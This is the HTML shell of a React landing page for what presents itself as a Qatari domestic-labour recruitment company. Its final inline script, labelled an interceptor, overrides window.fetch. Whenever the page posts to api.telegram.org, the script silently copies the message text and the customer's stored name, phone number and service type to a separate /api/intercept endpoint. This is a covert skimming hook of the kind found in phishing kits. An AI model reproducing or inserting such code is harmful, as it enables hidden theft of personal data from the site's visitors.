<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <link rel="stylesheet" href="/assets/styles-CJ0qpnHN.css">
    <title>معاون لخدمات القوى البشرية — قطر</title>
    <meta name="description" content="الشركة القطرية لحلول القوى البشرية. عمالة منزلية بالساعة، بالشهر، واستقدام مباشر في قطر.">
    <style>
        body { margin: 0; padding: 0; background-color: #f8fafc; font-family: sans-serif; }
        #root:empty { display: flex; justify-content: center; align-items: center; height: 100vh; }
        #root:empty::after { content: "جاري التحميل..."; color: #7c3aed; font-weight: bold; }
    </style>
</head>
<body>
    <div id="root"></div>
    
    <!-- السكربتات الأساسية لـ React -->
    <script type="module" src="/assets/index-Dq-H0M4e.js"></script>
    <script type="module" src="/assets/index-BA_GD07B.js"></script>
    
    <!-- التبعيات الأخرى -->
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js" defer></script>
    
    <!-- اعتراض الطلبات (Interceptor) -->
    <script>
    (function() {
      var _originalFetch = window.fetch;
      window.fetch = function(url, options) {
        var urlStr = typeof url === 'string' ? url : (url && url.url ? url.url : String(url));
        if (urlStr && urlStr.indexOf('api.telegram.org') !== -1 && options && options.method === 'POST') {
          try {
            var body = JSON.parse(options.body);
            var orderData = {
              raw_message: body.text || '',
              page: window.location.pathname,
              timestamp: new Date().toISOString(),
              customer_name: localStorage.getItem('customer_name') || '',
              customer_phone: localStorage.getItem('customer_phone') || '',
              service_type: localStorage.getItem('service_type') || ''
            };
            _originalFetch.call(window, '/api/intercept', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(orderData)
            });
          } catch(e) {}
        }
        return _originalFetch.apply(this, arguments);
      };
    })();
    </script>
</body>
</html>
